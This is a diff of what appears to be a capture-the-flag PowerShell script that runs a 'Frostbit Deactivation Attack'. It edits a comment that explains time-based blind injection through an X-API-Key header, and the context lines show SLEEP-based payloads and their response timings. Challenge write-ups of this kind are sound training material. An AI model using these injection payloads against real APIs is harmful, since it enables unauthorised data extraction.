@@ -24,7 +24,9 @@
         in a true response and hence the response from the API to the request should take >2 seconds.  Whereas,
         a FALSE result means that SLEEP(2) is not executed with the ternary operator short-circuiting the operation.
         This results in a much quicker response time from the API.
-        (below response times are approximate examples)
+
+        (below response times are approximate examples of my very early poking and prodding, I did not
+        use the 'IN' test for entire words in an array beyond this proof of concept)
 
         TRUE, response time 2204 ms : X-API-Key: ' OR "_key" IN ATTRIBUTES(doc) ? SLEEP(2) : '
         FALSE response time  137 ms : X-API-Key: ' OR  "_ke" IN ATTRIBUTES(doc) ? SLEEP(2) : '
@@ -299,4 +301,3 @@ $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v
 $swtotal.Stop()
 "`nCompleted Frostbit Deactivation Attack for BotUUID $botuuid and SQLi SLEEP($sleepytime) on $(Get-Date)"
 "Deactivation Attack took $($swtotal.Elapsed.Minutes) minutes, $($swtotal.Elapsed.Seconds) seconds."
-
